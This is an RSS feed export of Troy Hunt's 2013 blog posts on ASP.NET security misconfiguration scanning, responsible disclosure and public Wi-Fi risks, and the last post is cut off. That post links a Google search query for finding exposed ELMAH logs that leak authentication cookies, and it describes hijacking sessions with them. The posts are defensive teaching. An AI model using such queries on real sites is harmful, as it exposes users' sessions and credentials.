{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/0sjQHMWcphI/dynamic-security-misconfiguration.html","title":"Dynamic security misconfiguration scanning with OnCheckin and ASafaWeb","published":{"$wrap":"$date","v":1371679260001,"h":"2013-06-19T22:01:00.001Z"},"starred":false,"read":false,"content":"<p>Here’s the thing about security – you can’t just “do it” then move on. What I mean by this is that it’s a continuous process and thinking that you only need to just implement some secure coding standards or scan the website once before go live leaves a great big hole in your process.</p><p>For example, the other day I wrote about how<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">insecurity is easy</a>where I talked about how Black and Decker had exposed ELMAH logs. This is the tiniest of security misconfigurations which can easily happen at any time but it meant that they ended up with the credentials from a significant portion of their customer base publicly accessible – ouch! Ok, this also involved storing plain text passwords in cookies in order to facilitate the “remember me” function (no, really), but the point is in how easy it was to make a simple change that blew a massive hole in the side of their security profile.</p><p>This brings me to the point of the post: security misconfiguration happens and you need to start looking for it bang after you publish the site. Exposed ELMAH logs is one thing but simple security misconfiguration changes you can screw up on release of an ASP.NET website go well beyond that; custom errors, tracing, request validation and the way your cookies are configured to name but a few. Each of these can be configured to leave a site vulnerable in literally just a few seconds.</p><p>For the last couple of years I’ve provided a service to detect these problems in a live site –<a href=\"https://asafaweb.com\">ASafaWeb</a>. The value proposition of ASafaWeb has always been that on demand, you can scan your live ASP.NET website and it will report on these security misconfigurations. Now I’m very happy to share how ASafaWeb has been integrated into<a href=\"https://oncheckin.com/\">OnCheckin</a>(the brainchild of<a href=\"http://www.diaryofaninja.com/\">Doug Rathbone</a>) to provide continuous deployment for ASP.NET websites as a cloud-based service.</p><p><img width=\"492\" height=\"101\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"OnCheckin - Cloud Powered Deployment\" src=\"http://lh4.ggpht.com/-QewvOaRCVAE/UcIqJJcxP2I/AAAAAAAAFa0/Lq_jFP5xOfA/OriginalLogo2.png?imgmax=800\" border=\"0\"></p><a name='more'></a><p>Here’s how it works: Firstly, you plug it into source control:</p><p><img width=\"791\" height=\"636\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring source control\" src=\"http://lh3.ggpht.com/-9gS7OyP31vg/UcIqJ9H9scI/AAAAAAAAFa8/yVX3JMb2QA0/image2.png?imgmax=800\" border=\"0\"></p><p>Then you configure the deployment:</p><p><img width=\"785\" height=\"968\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring deployment\" src=\"http://lh6.ggpht.com/-dLELbPIfWuk/UcIqKXe-9EI/AAAAAAAAFbE/pfNLEqbO4OA/image5.png?imgmax=800\" border=\"0\"></p><p>Then finally you review everything and tick the box to run the ASafaWeb scan after every deployment:</p><p><img width=\"788\" height=\"888\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring ASafaWeb\" src=\"http://lh5.ggpht.com/-Uyoj7L3jeDU/UcIqLFxOwbI/AAAAAAAAFbM/wUxPb48a3ao/image31.png?imgmax=800\" border=\"0\"></p><p>That’s it – job done! Now each time the scan runs there’ll be a little ASafaWeb tab and a nice report on how the scan went:</p><p><img width=\"880\" height=\"522\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The ASafaWeb report in OnCheckin\" src=\"http://lh3.ggpht.com/-xlPwH-zRX9Q/UcIqLwBN_AI/AAAAAAAAFbU/EtXZ9ZXtZWk/image11.png?imgmax=800\" border=\"0\"></p><p>What I really like about this is the continuous nature of the process. Every time that build runs, the site is going to get scanned and so long as you’re keeping an eye on the results you shouldn’t have sneaky security misconfigurations making their way through to production. Well at least not for very long!</p><p>The other thing about this integration is that it’s another step towards publicly releasing the ASafaWeb API. Yes, there’s an API and in fact it’s been used extensively as the magic behind the<a href=\"http://www.troyhunt.com/2012/08/welcome-to-asafaweb-scheduler.html\">ASafaWeb Scheduler</a>which gives you the ability to scan your sites on a regular basis (I mentioned it’s free, right?!). The intention has always been to open the API up for anyone to consume I reckon including it into the continuous integration cycle is a fantastic use-case.</p><p>To that effect, if you’re involved in a similar project and would like to integrate ASafaWeb then I’d love to hear from you. I’m happy to open it up to beta testers who want to contribute feedback and I know there are a<em>ton</em>of good ideas out there for how it might be used.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/0sjQHMWcphI\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1220}}
{"k":"0000000084","o":"0000002067","v":"001"}
{"_id":1221,"_uid":1221,"_dt":1373742620963,"_s":"8ac980ccb3b6179def855dcde0c6a096"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/OIygwkMpIxk/video-hack-yourself-first-and-other.html","title":"Video: “Hack Yourself First” and other security tips for web developers","published":{"$wrap":"$date","v":1372151340001,"h":"2013-06-25T09:09:00.001Z"},"starred":false,"read":false,"content":"<p>A little while back I wrote about<a href=\"http://www.troyhunt.com/2013/05/hack-yourself-first-how-to-go-on.html\">Hacking yourself first</a>and detailed a bunch of different ways for developers to seek out risks in their own apps, hopefully before attackers find them first. I’m extremely enthusiastic about this approach and believe that developers need to hone cyber-offence skills in order to properly understand – and protect their apps from – risks on the web. There’s a heap more content coming from me along these lines in a variety of formats and today it’s a free video discussion on<a href=\"http://tv.ssw.com/3780/hack-yourself-first-and-other-security-tips-for-web-developers\">SSW TV</a>.</p><p>These guys do a bunch of great videos on various development topics that are up on their website for free, even including my user group talk on<a href=\"http://www.troyhunt.com/2012/03/ssw-tv-protecting-your-web-apps-from.html\">Protecting your web apps from the tyranny of evil with OWASP recorded last year</a>(effectively walking through the OWASP Top 10 for ASP.NET). Today’s video is a chat with SSW’s<a href=\"http://blog.damianbrady.com.au/\">Damian Brady</a>and we touch on a heap of different issues related to the web, ASP.NET and security in general. It’s a casual, unscripted discussion that hopefully contains some useful info for the security-conscious developer.</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/I6uKwdwQGhg?feature=player_embedded\" frameborder=\"0\" allowfullscreen=\"\"></iframe><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/OIygwkMpIxk\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1221}}
{"k":"0000000084","o":"0000022484","v":"001"}
{"_id":1222,"_uid":1222,"_dt":1373742620964,"_s":"fd3e320f6761e23158f51bde34c1a85e"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/fhxbf8LPLU8/the-responsibility-of-public-disclosure.html","title":"The responsibility of public disclosure","published":{"$wrap":"$date","v":1369773480001,"h":"2013-05-28T20:38:00.001Z"},"starred":false,"read":false,"content":"<p>There’s this debate that goes round and round about a process that’s commonly known as responsible disclosure or in other words, notifying the owner of a system that their security sucks and giving them the opportunity to fix it rather than telling the great unwashed masses and letting them have at a vulnerable system. The theory goes that responsible disclosure is the<em>ethical</em>thing to do whilst airing website security dirty laundry publicly makes you an irresponsible cowboy, or something to that effect.</p><p>But of course these things are not black and white. On a daily basis I’ll see tweets about how a website is storing credentials in plain text: “Hey [insert name here], what’s the go with emailing my password, aren’t you protecting it?”. Is this “responsible”? I think it’s fair to say it’s not<em>irresponsible</em>, I mean the risk is obvious, right?</p><p>How about security risks such as an XSS flaw which might be a little more grey, but is still shared frequently in public? It’s not exactly going to land you the mother lode of sensitive data in a couple of clicks, but it could be used as part of a more sophisticated attack. Or move right on to the other end of the scale where serious flaws lead to serious breaches. It might be default credentials on an admin system or publicly accessible backups, the point is it’s in another realm of risk and impact altogether.</p><p>Anyway, the reason for this post is that a number of events over recent times have given me pause for what<em>I</em>consider responsible disclosure. These events are numerous and include incidents where I’ve ticked every responsibility box in the book and incidents where I’ve been accused of being, well, a cowboy. I wanted to capture – with as much cohesion as possible – what I consider to be responsible disclosure because sure enough, I’ll be called on this again in the future and I want to have a clear point of view that simply won’t fit into 140 characters.</p><p>I’d like to start with two disclosure stories that took very different tacks with different outcomes for both the sites and me personally. Here’s what happened:</p><a name='more'></a><h4>Disclosure story 1: Westfield</h4><p>Two years ago I wrote about<a href=\"http://www.troyhunt.com/2011/09/find-my-car-find-your-car-find.html\">Find my car, find your car, find everybody’s car; the Westfield’s iPhone app privacy smorgasbord</a>. In short, the Westfield shopping centre here in Sydney down at Bondi had an app to help you find your car but it readily disclosed the license plate of every vehicle in the centre’s 2,550 car spaces via an improperly protected JSON feed. Oops.</p><p>This went straight up onto my blog and subsequently,<a href=\"http://www.theaustralian.com.au/australian-it/westfield-iphone-app-in-privacy-fiasco/story-e6frgakx-1226137939073\">straight into the national media</a>. I posted it in the morning and just a few hours later the system was offline. Shortly after that I had a call from the (rather sheepish) developers of it in the US. By mid-afternoon the General Manager had<a href=\"http://www.troyhunt.com/2011/09/find-my-car-find-your-car-find.html#comment-309304475\">commented on my blog post</a>and later made contact personally. He called me that night and we had a very constructive discussion; there wasn’t any anger or malice, it was entirely “Holy shit, this isn’t cool, how do we fix it” which IMHO, was entirely the correct response as it lead to the system getting fixed very quickly.</p><p>tl;dr: the risk was removed almost instantly, the developers were open and receptive, the management was appreciative and hopefully developers everywhere got to learn a thing or two about securing their APIs. Perhaps most importantly though, at-risk customers were spared as quickly as possible from the potential ramifications of disclosing their personal movements.</p><h4>Disclosure story 2: Black and Decker</h4><p>This is very timely as it all took place last week. As I wrote about just yesterday in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy – demonstrating a simple misconfiguration risk</a>, Black and Decker had exposed ELMAH logs. Their unfortunate architecture decision to store credentials in cookies (you heard me) meant these were recorded in the logs which numbered 50,000+. So here we have a veritable treasure trove of usernames, passwords, IP addresses, request headers, internal code and other titbits – clearly something to be disclosed privately and obviously given the significance they’d take it seriously and respond promptly. Or so I thought.</p><p>After recording the video for the aforementioned post on Monday afternoon last week (these are all Sydney times), I quickly reached out to Black and Decker on Twitter:</p><p><a href=\"https://twitter.com/troyhunt/status/336384092880908288\"><img width=\"487\" height=\"259\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"@Black_DeckerUS is there a private channel I can report a serious security vulnerability on your website through? Or follow so I can DM.\" src=\"http://lh3.ggpht.com/-JaFPvXVVXsQ/UaUVZmBvs6I/AAAAAAAAFWY/AnK83TgrJME/SNAGHTML3270d742.png?imgmax=800\" border=\"0\"></a></p><p>I didn’t hear anything back over the next few hours but given their Twitter account apparently doesn’t come online until 8am in Maryland (22:00 for me), that’s not surprising. Nearly an hour after they should have come online and still no contact so I send an email after finding a support address on the website:</p><p><a href=\"http://lh4.ggpht.com/-qhr0qx3cDrQ/UaUVbNeeLiI/AAAAAAAAFWg/lJhkQWN1r6Q/s1600-h/SNAGHTML30565432.png\"><img width=\"731\" height=\"373\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"First email to Black and Decker\" src=\"http://lh6.ggpht.com/-i0--pnMa9o0/UaUVc9HZ4bI/AAAAAAAAFWo/-Ac7AOQ-Q6s/SNAGHTML3056543_thumb.png?imgmax=800\" border=\"0\"></a></p><p>The next morning I get up and there’s a DM waiting for me that had come in at 04:12:</p><p><a href=\"http://lh5.ggpht.com/-dkt5OSfvE7E/UaUVe8D8XbI/AAAAAAAAFWw/lagW2UwG-98/s1600-h/image72.png\"><img width=\"406\" height=\"88\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Feel free to send us contact information and we can have someone reach out to you.\" src=\"http://lh3.ggpht.com/-q3nNUAnBhDU/UaUVga6khhI/AAAAAAAAFW4/Iqaea8HOWKw/image7_thumb.png?imgmax=800\" border=\"0\"></a></p><p>Great! So I write up a response about checking their ELMAH and… can’t send, not following. Great, back to public Twitter then:</p><p><a href=\"https://twitter.com/troyhunt/status/336589704919142400\"><img width=\"487\" height=\"232\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"@Black_DeckerUS hi, I got your DM re website security but I can't respond privately unless you follow me.\" src=\"http://lh5.ggpht.com/-5PK06aj3MP4/UaUVgwiMDRI/AAAAAAAAFXA/Xn66sEJBqls/SNAGHTML3edc8742.png?imgmax=800\" border=\"0\"></a></p><p>No response a few hours later so it’s back to the masses to try and get some help:</p><p><a href=\"https://twitter.com/troyhunt/status/336634077211938818\"><img width=\"487\" height=\"292\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"I'm having no success privately getting through to @Black_DeckerUS about a very major vuln, anyone got a contact there?\" src=\"http://lh6.ggpht.com/-ukJmY9oHJQI/UaUVhbkHH5I/AAAAAAAAFXI/6LZ2V6iQkNk/SNAGHTML40373542.png?imgmax=800\" border=\"0\"></a></p><p>Night comes and goes, still no response so I try again the next day:</p><p><a href=\"https://twitter.com/troyhunt/status/336958960785563648\"><img width=\"487\" height=\"319\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Still can't get a response from @Black_DeckerUS re a very serious vuln in their website - can't DM and no response to email. Any contacts?\" src=\"http://lh6.ggpht.com/-2WdWqCemezc/UaUVh09dM2I/AAAAAAAAFXM/KlWGyKXd8F0/SNAGHTML41afbc42.png?imgmax=800\" border=\"0\"></a></p><p>It’s now 38 hours since I’ve tried making contact through two different channels, they know there’s “a serious security vulnerability” as they’ve DM’d me (without a follow-back so I can respond privately) and I still can’t get through. Time to go local and see if someone down here can help:</p><p><a href=\"http://lh6.ggpht.com/-06tch22MM8k/UaUVifbHQuI/AAAAAAAAFXY/Ut3MJA9X41M/s1600-h/SNAGHTML5426d832.png\"><img width=\"731\" height=\"365\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Second email to Black and Decker\" src=\"http://lh6.ggpht.com/-OVU8NR1SR9c/UaUVjKrwd2I/AAAAAAAAFXg/n4iyOvGsx8c/SNAGHTML5426d83_thumb.png?imgmax=800\" border=\"0\"></a></p><p>The day passes and nobody down here responds then<a href=\"https://twitter.com/anders_abel/status/337062950521163776\">a friendly Twitter follower suggests contacting the admin address on the DNS record</a>so it’s back to the email again:</p><p><a href=\"http://lh6.ggpht.com/-oEOzRRCY_tI/UaUVkrEaPyI/AAAAAAAAFXo/-xhfFy_HnuI/s1600-h/SNAGHTML1f6d31532.png\"><img width=\"731\" height=\"371\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Third email to Black and Decker\" src=\"http://lh6.ggpht.com/-nh-1Hmq79Ps/UaUVmkbqMTI/AAAAAAAAFXw/8E0rhRNohQ8/SNAGHTML1f6d3153_thumb.png?imgmax=800\" border=\"0\"></a></p><p>Still nothing come through overnight, let’s give Twitter another go a put a bit more urgency into it:</p><p><a href=\"https://twitter.com/troyhunt/status/337307898755547136\"><img width=\"487\" height=\"323\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"I *still* can't get hold of @Black_DeckerUS re a major security risk. You've got publicly accessible customer data; email or DM for details.\" src=\"http://lh5.ggpht.com/-VFjJhllwHuw/UaUVoMizhgI/AAAAAAAAFX4/RfhZN7edL9k/SNAGHTML541013a42.png?imgmax=800\" border=\"0\"></a></p><p>Another friendly follower<a href=\"https://twitter.com/tifkin_/status/337210616806785024\">suggests using LinkedIn to find someone</a>so I jump over there and manage to find an “Information Technology and Risk Management Executive” who actually has a common previous employer to me and several common contacts. This looks like a winner:</p><p><img width=\"519\" height=\"402\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Contacting via LinkedIn\" src=\"http://lh3.ggpht.com/-3n7g-Lz3MG0/UaUVpl3XS7I/AAAAAAAAFYA/dW7n5OmCZok/image2.png?imgmax=800\" border=\"0\"></p><p>This is now the 9th time I’ve tried to get in touch with Black and Decker. Finally<em>someone</em><em>from Microsoft</em>responds via Twitter and advises they have a relationship with Black and Decker. I privately email their @microsoft.com address on the evening of the 23rd (now the 10th contact) including the<a href=\"https://code.google.com/p/elmah/wiki/SecuringErrorLogPages\">ELMAH Securing Error Log Pages</a>link and they promptly pass it on. Come the morning of the 24th, here’s what happens:</p><p><img width=\"609\" height=\"469\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"ELMAH log now protected at /elmah.axd\" src=\"http://lh4.ggpht.com/-GUFHmN1dpUc/UaUVqiTwnEI/AAAAAAAAFYI/TCOXa70NmcA/image311.png?imgmax=800\" border=\"0\"></p><p>Success! Looks like I’ve finally gotten through! Except, well, I hadn’t really:</p><p><img width=\"609\" height=\"469\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"ELMAH log not protected at /foo/elmah.axd\" src=\"http://lh6.ggpht.com/-yrbc41G-kZE/UaUVsPH0tRI/AAAAAAAAFYQ/C1SGG9iHc3s/image61.png?imgmax=800\" border=\"0\"></p><p>This is a little issue that came up in<a href=\"http://www.troyhunt.com/2012/01/aspnet-session-hijacking-with-google.html\">my original post on session hijacking with Google and ELMAH</a>and it’s because the handler is registered globally yet explicitly secured only when it appears in the root. It’s a simple fix that’s (now) explained very clearly on the ELMAH site (which I’d sent them), the handler just needs to be registered beneath the location in which it’s used.</p><p>So the 11th contact goes out and it’s back to Microsoft because I<em>still</em>haven’t had any personal contact from Black and Decker. I had a response from Microsoft just 9 minutes later even though it was about 19:30 local so kudos to them for their proactivity. Remember, this was all on the morning of the 24th (Friday last week) but by late that evening my time ELMAH was still accessible. Granted, it was evening over in the US but we’re now more than 100 hours into this saga.</p><p>Finally, come Saturday morning, ELMAH is secure. That’s four and a half days of time wasted from initial contact to securing the risk. Remember, this involved customers’ usernames and passwords on public display, no doubt in many cases the same ones they use for their email or to do their banking.</p><p>4 days after everything was resolved and 9 days since I first raised the risk, I’ve also not had any response from Black and Decker. Zero. Zip. Nada. Not a “Thanks mate” nor a “Mighty nice of you to point this out privately”, no “How might we fix this?” or “Is there anything else we should look at?”, just absolute silence. Now I don’t privately disclose in order to achieve any sort of personal benefit, but by my moral compass when you do someone a favour – particularly one that could save them a great deal of inconvenience – a little gratitude in response goes a long way.</p><p>This incident plus the Westfield one and literally dozens of others – some I’ve written about, many I’ve not – lead me to wonder: what circumstances predicate themselves to private disclosure? When is public a better option? I broke it down into three measures, let me explain.</p><h4>1. What is the purpose of disclosing the risk?</h4><p>Particularly when a public disclosure lands on the front page of the news and consequently on the CTO’s (or even CEO’s) desk, inevitably the question comes up – why’d he do it? What’s in it for him? What does this guy want from us?</p><p>On numerous occasions, after making a public disclosure I’ve had private responses which clearly indicate the sender is under the impression that I’m after money. You can almost read “Ok, how much do you want to help us fix this thing?” between the lines of an otherwise polite but curt response. This can<em>never</em>be the intent of disclosure, doing this would amount to nothing less than running an extortion racket.</p><p>The purpose<em>cannot</em>be self-serving, when this is the case there’s nothing to stop you from running around calling out every single vuln you find and to hell with the consequences. Whilst there’s unarguably a reputation boost from a carefully constructed public disclosure, there has to be a “greater good”.</p><p>The single most significant beneficiary of public disclosures I make are software developers. I want to help these guys understand the ins and outs of website security and nothing gets their attention more than publicly calling out examples. But just as importantly, you have to help them understand<em>why</em>the risks are, well, risks. Also just as importantly, you need help them understand how to fix those risks, not just stand there and give a “Ha Ha” Nelson Muntz style, that’s really not going to help anyone.</p><p><img width=\"400\" height=\"250\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Nelson Muntz - Ha Ha!\" src=\"http://lh5.ggpht.com/-lj7gA6jC_dE/UaUVt-0MNsI/AAAAAAAAFYY/8KQ3957hMOs/seven_bullies_062.png?imgmax=800\" border=\"0\"></p><p>Of course the other beneficiary is those who would be impacted if the risk was exploited. If disclosing the risk will lead to the site owner rectifying it<em>before</em>customers can be adversely impacted, then that’s a good thing. Which leads me neatly to the second point.</p><h4>2. Who is the victim if it’s exploited?</h4><p>When a vuln is disclosed, naturally there is a risk that someone will then exploit it. Who is impacted if that happens is extremely important because in the scheme of exploited website risks there are really two potential victims: the users of the site and the site owner.</p><p>In this context, website users are innocent parties, they’re simply using a service and expecting that their info will be appropriately protected. Public disclosure must not impact these guys, it’s simply not fair. Dumping passwords alongside email addresses or usernames, for example, is going to hurt this group. Yes, they shouldn’t haven’t reused their credentials on their email account but they did and now their mail is pwned. That’s a completely irresponsible action on behalf of those who disclosed the info and it’s going to seriously impact ordinary, everyday people.</p><p>On the other hand, disclosing XSS or TLS flaws doesn’t pose an immediate threat to consumers, an attacker still needs to go out and weaponise the risk. This might involve the attacker constructing phishing scams or organising themselves to the extent that they can actually go and sniff packets from at-risk users. Of course this happens, but it takes some effort, at least enough effort so that the site owner can fix or disable the feature in advance.</p><p>On the other hand, risks that impact only the site owner are, in my humble opinion, fairer game. The site owner is ultimately accountable for the security position of their asset and it makes not one iota of difference that the development was outsourced or that they rushed the site or that the devs just simply didn’t understand security. When the impact of disclosure is constrained to those who are ultimately accountable for the asset, whether that impact be someone else exploiting the risk or simply getting some bad press, they’ve only got themselves to blame.</p><h4>3. What is the likelihood of the risk being fixed?</h4><p>There are many instances on this blog where I’ve written about poor security. There are many instances<em>not</em>on this blog where I’ve privately written to website owners about poor security. Overwhelmingly, risks I’ve disclosed publicly have been taken seriously and equally overwhelming, risks I’ve disclosed privately haven’t been. There are exceptions, but there is no arguing the pattern and it’s exemplified by the Westfield and Black and Decker examples I opened with.</p><p>When a risk is disclosed publicly, the website owner is on notice. There is no arguing the increased visibility public disclosure creates and there is also no arguing that it expedites the remediation process on behalf of the site owner. Partly this is due to the increased likelihood of the risk being exploited and partly it’s because in the face of public naming and shaming, the site owner is somewhat compelled to respond.</p><p>The other thing that tends to happen when a risk is made public is that the one lone voice that was the discloser suddenly becomes a chorus of like-minded individuals. For example,<a href=\"https://twitter.com/UKTesco/status/229542141012107265\">this tweet</a>has now been RT’d over 2,100 times and as you’ll see from the responses, generated an awful lot of noise about the woeful state of Tesco’s security. You can’t ignore that sort of pressure (certainly<a href=\"http://www.itpro.co.uk/642391/ico-to-investigate-tesco-over-website-security-concerns\">the ICO didn’t</a>) and without doubt it increases the pressure on an organisation to address their security.</p><h4>Moving forward</h4><p>I hope this gives some insight into my personal view of disclosure, I wouldn’t have approached Black and Decker any differently (it doesn’t satisfy rule 2 on victim impact) and likewise I wouldn’t have approached Westfield any differently (the results speak for themselves). Sometimes<a href=\"https://twitter.com/zimzat/status/328996255537696768\">people will have views that differ</a>but frankly, if I can satisfy those measures I’ve described above then I can sleep at night with confidence that on balance, security on the web has benefited.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/fhxbf8LPLU8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1222}}
{"k":"0000000084","o":"0000002905","v":"001"}
{"_id":1223,"_uid":1223,"_dt":1373742620964,"_s":"9dfaa28d59595c3b41454a10ae348a2a"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/qRt9JTyYGKk/talking-with-scott-hanselman-on.html","title":"Talking with Scott Hanselman on honeypots, pineapples and SSL","published":{"$wrap":"$date","v":1369642440001,"h":"2013-05-27T08:14:00.001Z"},"starred":false,"read":false,"content":"<p>For many of you,<a href=\"http://www.hanselman.com/\">Scott Hanselman</a>will need no introduction and is a very familiar face, voice and writer. Among the many good things that Scott does to support the web development community (and that’s not just the Microsoft folks either), he’s also the man behind the<a href=\"http://www.hanselminutes.com/372/are-you-secure-wifi-honeypots-pineapples-and-ssl-with-troy-hunt\">Hanselminutes podcast</a>which I was very happy to join him on recently. In fact this remains one of the very few podcasts where I actually listen to every episode – regardless of the direct relevance to me – simply because it’s delivered in such a professional manner and I know I’m going to learn something each time.</p><p>The podcast has gone out under the title<a href=\"http://www.hanselminutes.com/372/are-you-secure-wifi-honeypots-pineapples-and-ssl-with-troy-hunt\">Are you secure? WiFi Honeypots, Pineapples and SSL with Troy Hunt</a>which is pretty self-explanatory. As per the title, we mostly discuss the risks presented by using public wifi plus the importance of HTTPS for those of us who are building web apps. Let me share some supplementary material which I’ve either touched on in that talk or will be of relevance to interested listeners:</p><ol><li><a href=\"http://www.troyhunt.com/2011/01/ssl-is-not-about-encryption.html\">SSL is not about encryption</a></li><li><a href=\"http://www.troyhunt.com/2011/11/owasp-top-10-for-net-developers-part-9.html\">OWASP Top 10 for .NET developers part 9: Insufficient Transport Layer Protection</a></li><li><a href=\"http://www.troyhunt.com/2013/04/5-ways-to-implement-https-in.html\">5 ways to implement HTTPS in an insufficient manner (and leak sensitive data)</a></li><li><a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">Your login form posts to HTTPS, but you blew it when you loaded it over HTTP</a></li><li><a href=\"http://www.troyhunt.com/2013/04/the-beginners-guide-to-breaking-website.html\">The beginners guide to breaking website security with nothing more than a Pineapple</a></li><li><a href=\"http://www.troyhunt.com/2013/05/pineapple-surprise-mixing-trusting.html\">Pineapple Surprise! Mixing trusting devices with sneaky Wi-Fi at #wdc13</a></li></ol><p>There’s a lot more related content beneath those but that’s a good starting point. I hope you enjoy the podcast!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/qRt9JTyYGKk\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1223}}
{"k":"0000000084","o":"0000005533","v":"001"}
{"_id":1224,"_uid":1224,"_dt":1373742620964,"_s":"3350390f570dc4b6c0664634fe804bb6"}
{"subscription":{"$wrap":"$oid","v":57},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/1gV-R5Qrv3k/security-is-hard-insecurity-is-easy.html","title":"Security is hard, insecurity is easy – demonstrating a simple misconfiguration risk","published":{"$wrap":"$date","v":1369693560001,"h":"2013-05-27T22:26:00.001Z"},"starred":false,"read":false,"content":"<p>One could argue that security is hard. Not all aspects of it, mind you, but the prevalence of website hacks would seem to indicate that plenty of people are struggling to get it right.</p><p>On the other hand,<em>insecurity</em>can be very easy. What I mean by this is that sometimes it can be the smallest change to a website that blows the security wide open.</p><p>Last week someone passed me a private note about Black and Decker, or more to the point, they passed me a link to an unsecured ELMAH log. For the uninitiated, ELMAH logs and their discovery via Google is something<a href=\"http://www.troyhunt.com/2012/01/aspnet-session-hijacking-with-google.html\">I’ve written about before</a>. In fact in this very case it was someone simply searching for some info on ELMAH that lead to this discovery – it’s that easy.</p><p>Now I want to stress that<strong><em>this is not intended to be all about Black and Decker</em></strong>and before posting this I did privately contact them and they have now correctly secured the logs. In fact<strong><em>there are tens of thousands of<a href=\"https://www.google.com/search?q=inurl%3Aelmah.axd+ASPXAUTH\">Google results for publicly exposed ELMAH logs</a></em></strong>so clearly this is a very prevalent risk. Let me first share the video on what you can do with exposed ELMAH logs then I’ll come back around to the point of this post:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/6ipVqkUm6Gw?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>That should put things into context regarding the risk of exposed ELMAH logs and it goes<em>well</em>beyond just session hijacking. For example the risk includes access to:</p><ol><li>Customer email addresses as they’re stored in the cookie</li><li>IP address of users (including of individual customers per the previous point)</li><li>Passwords (these are also sometimes stored in cookies)</li><li>Referrers (discloses entry points into the site)</li><li>Any other data on the site that is accessible if the session can be hijacked</li></ol><p>Keep in mind that there are tens of thousands of log entries in this particular site so there’s quite a profile an attacker could have built up.</p><p>Here’s the point I want to make:<strong><em>a frankly massive security hole like exposed ELMAH logs can occur as a result of the smallest configuration change</em></strong>and it begs the following questions:</p><p><strong>Is there any continuous security scanning of the site?</strong>This was a very basic error and in fact my own very basic<a href=\"https://asafaweb.com/\">ASafaWeb</a>scanner could have caught this on a daily scheduled scan and reported it within 24 hours of the risk occurring. Other commercial products could have identified a far broader range of risks but the point is that security scanning needs to be<em>continuous</em>, not just a one off, not on an annual basis, not just on major changes but<em>all the time</em>.</p><p><strong>Who can release changes?</strong>You’ve gotta wonder if a case like this was just a 